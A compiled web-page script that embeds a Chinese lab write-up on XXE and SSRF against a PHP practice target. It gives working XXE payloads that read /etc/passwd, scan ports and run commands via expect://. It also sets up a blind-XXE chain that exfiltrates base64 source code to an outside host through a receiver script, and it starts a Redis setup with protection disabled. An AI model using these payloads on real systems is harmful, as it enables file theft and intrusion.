"use strict";(self.webpackChunkvuepress_theme_hope_template=self.webpackChunkvuepress_theme_hope_template||[]).push([[4992],{81021:(i,s)=>{s.A=(i,s)=>{const a=i.__vccOpts||i;for(const[i,h]of s)a[i]=h;return a}},55361:(i,s,a)=>{a.r(s),a.d(s,{comp:()=>E,data:()=>q});var h=a(6254);const n=a.p+"assets/img/image-20240922191517-poz1ajn.abda5b9e.png",l=a.p+"assets/img/image-20240922191941-a8ambig.d623a461.png",t=a.p+"assets/img/image-20240922192506-rz3b5vo.c1441640.png",k=a.p+"assets/img/image-20240922193420-e3xochz.a13e58a3.png",e=a.p+"assets/img/image-20240922200556-7pdq0ul.98ef4474.png",p=a.p+"assets/img/无回显XXE-20240922215733-f2ot2uw.4496983d.png",d=a.p+"assets/img/image-20240922215314-6407xqb.736aefa9.png",r=a.p+"assets/img/image-20240922204207-9uv3zzp.f9a7f8dc.png",g=a.p+"assets/img/image-20240922210616-ypvjrr9.36bc373c.png",F=a.p+"assets/img/image-20240922215228-8kal3a2.c5e22ae1.png",A=a.p+"assets/img/image-20240919193403-0wqmkpj.d3fe5d05.png",y=a.p+"assets/img/image-20240919193435-s0eryi8.3111d4a2.png",B=a.p+"assets/img/image-20240920230026-013ubbi.eb45df13.png",c=a.p+"assets/img/image-20240919222524-d1qr771.6c3e6571.png",o=a.p+"assets/img/image-20240919223344-eotn41v.f17df093.png",m=a.p+"assets/img/image-20240919224230-op2jdxe.580e4265.png",u=a.p+"assets/img/image-20240920233740-k7rmenn.8304c506.png",v=a.p+"assets/img/image-20240921002900-0qjzbcd.06765b38.png",C=a.p+"assets/img/image-20240920234721-7ceyro5.120cbc5c.png",b=a.p+"assets/img/image-20240921003140-pl5ghty.0f9cee23.png",D=a.p+"assets/img/image-20240921003418-9ww4qj5.9c93d48c.png",w=a.p+"assets/img/image-20240921003055-yykogn6.d303a9c5.png",f=a.p+"assets/img/image-20240921003619-xciweev.2a845580.png",x={},E=(0,a(81021).A)(x,[["render",function(i,s){return(0,h.uX)(),(0,h.CE)("div",null,s[0]||(s[0]=[(0,h.Fv)('<h1 id="xxe-ssrf" tabindex="-1"><a class="header-anchor" href="#xxe-ssrf"><span>XXE&amp;SSRF</span></a></h1><h2 id="xxe" tabindex="-1"><a class="header-anchor" href="#xxe"><span>XXE</span></a></h2><h3 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现"><span>漏洞复现</span></a></h3><h4 id="xxe读文件" tabindex="-1"><a class="header-anchor" href="#xxe读文件"><span>XXE读文件</span></a></h4><ol><li><p>打开xxe_Lab for PHP的靶场，抓包。​<img src="'+n+'" alt="image" loading="lazy">​</p></li><li><p>判断是否有XXE注入漏洞</p><p>1、判定是否使用了xml进行数据传递</p><p>标签、Accept: application/xml, text/xml</p><p>2、确定是否有回显位置，或无回显，下图有回显。​</p><p><img src="'+l+'" alt="image" loading="lazy">​</p></li><li><p>写入payload。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xml version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1.0&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> encoding</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;UTF-8&quot;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">DOCTYPE</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> ANY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ENTITY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> a </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">SYSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;file:///etc/passwd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+t+'" alt="image" loading="lazy">​</p></li><li><p>另一种情况是外部参数实体。</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ENTITY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> xxe </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">SYSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;file:///etc/passwd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>http服务</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;!</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ENTITY</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> xxe</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> SYSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;file:///etc/passwd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xml version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1.0&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> encoding</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;UTF-8&quot;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">DOCTYPE</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> ANY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ENTITY</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> a </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">SYSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;http://47.113.187.190:90/wai.dtd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xxe</span><span style="--shiki-light:#000000;--shiki-dark:#FFFFFF;">;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">222</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>​<img src="'+e+'" alt="image" loading="lazy">​</p></li></ol><h4 id="xxe判断端口开放" tabindex="-1"><a class="header-anchor" href="#xxe判断端口开放"><span>XXE判断端口开放</span></a></h4><p>通过回显长度或页面特征判断</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">xml version</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1.0&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> encoding</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;UTF-8&quot;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">DOCTYPE</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> ANY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ENTITY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> a </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">SYSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;http://47.113.187.190:80&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#000000;--shiki-dark:#FFFFFF;">;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">222</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="命令执行" tabindex="-1"><a class="header-anchor" href="#命令执行"><span>命令执行</span></a></h4><p>前提：需要php环境安装了expect扩展</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span>\n<span class="line"><span>&lt;!DOCTYPE ANY[</span></span>\n<span class="line"><span>&lt;!ENTITY s SYSTEM &quot;expect://whoami&quot;&gt;        #空格可使用${IFS}替换</span></span>\n<span class="line"><span>]&gt;</span></span>\n<span class="line"><span>&lt;user&gt;&lt;username&gt;&amp;s;&lt;/username&gt;&lt;password&gt;admin2&lt;/password&gt;&lt;/user&gt;</span></span>\n<span class="line"><span></span></span>\n<span class="line"><span>expect://ls${IFS}-al        #举例</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="无回显xxe" tabindex="-1"><a class="header-anchor" href="#无回显xxe"><span>无回显XXE</span></a></h4><p>​<img src="'+p+'" alt="无回显XXE" loading="lazy">​</p><ol><li>先在第三方VPS创建两个文件，getshell.php、shell.dtd,,,,,当请求发送后被攻击端会访问这两个文件，并将文件内容返回。</li></ol><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#getshell.php</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">php</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">file_put_contents</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;shellout.txt&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">$</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;get&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">])</span><span style="--shiki-light:#000000;--shiki-dark:#FFFFFF;">;</span></span>\n<span class="line"><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#shell.dtd</span></span>\n<span class="line"></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ENTITY</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> a </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ftp6610290.host123.sanfengyun.cn/getshell.php?get=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">%f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ile;&#39;&gt;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a</span><span style="--shiki-light:#000000;--shiki-dark:#FFFFFF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li><p>浏览器访问这两个文件看能不能访问 200<img src="'+d+'" alt="image" loading="lazy">​</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p></li><li><p>payload web请求抓包</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">DOCTYPE</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> ANY</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ENTITY</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> file</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;"> SYSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;php://filter/read=convert.base64-encode/resource=doLogin.php&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:white;--shiki-dark:#FFFFFF;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">ENTITY</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> %</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> s </span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">SYSTEM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;http://ftp6610290.host123.sanfengyun.cn/shell.dtd&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">s;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">%</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">send;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">s</span><span style="--shiki-light:#000000;--shiki-dark:#FFFFFF;">;</span></span>\n<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">222</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;&lt;/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">user</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>第三方服务器查看返回来的文件内容，需要解码。</p><p>​<img src="'+F+'" alt="image" loading="lazy">​</p></li><li><p>坑：后面shellout.txt文件总是写不出来，需要将getshell.php的文件执行权限打开。777 ........😶(ˉ▽ˉ；)...</p></li></ol><p>​​</p><h2 id="在kali安装redis" tabindex="-1"><a class="header-anchor" href="#在kali安装redis"><span>在Kali安装Redis</span></a></h2><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">wget</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//download.redis.io/redis-stable.tar.gz</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#解压或两次解压</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">tar</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">zxf</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> redis</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">stable</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">tar</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">gz</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 进入到 redis-stable 目录</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">cd</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> redis</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">stable</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 编译</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">make</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">cd</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> src</span></span>\n<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#修改配置</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">vim</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> redis</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">conf</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">bind</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 127.0.0.1</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">注释，修改为：bind</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0.0.0.0</span></span>\n<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">protected</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">mode</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> yes修改为</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> no</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">启动</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">重载配置</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">重启</span></span>\n<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">ps</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">ef</span><span 